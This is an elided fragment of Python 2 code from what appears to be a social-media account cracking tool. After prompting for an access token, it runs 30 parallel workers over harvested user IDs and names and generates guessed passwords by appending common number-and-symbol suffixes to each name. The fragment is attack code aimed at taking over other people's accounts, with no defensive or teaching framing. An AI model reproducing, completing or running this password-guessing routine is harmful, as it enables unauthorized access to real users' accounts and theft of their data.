...
def login():
    ...
    try:
        ...
        sleep(2)
        logo()
        print ' [*] Meri Ghalti Nhi He'
        print ' [*] Yaar Token Daal Do'
        ...
        if ask == 'y':
            ...
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                ...
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [name + '123@', name + '1234@', name + '12345@', name + '12@', name + '789@', name + '567@', name + '234@', name + '678@', name + '890@', name + '2215', name + '1214', name + '4245']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [name + '123@', name + '1234@', name + '12345@', name + '12@', name + '789@', name + '567@', name + '234@', name + '678@', name + '890@', name + '2215', name + '1214', name + '4245']
                    else:
                        pwx = [
                                    name + '123@', name + '1234@', name + '12345@', name + '12@', name + '789@', name + '567@', name + '234@', name + '678@', name + '890@', name + '2215', name + '1214', name + '4245']
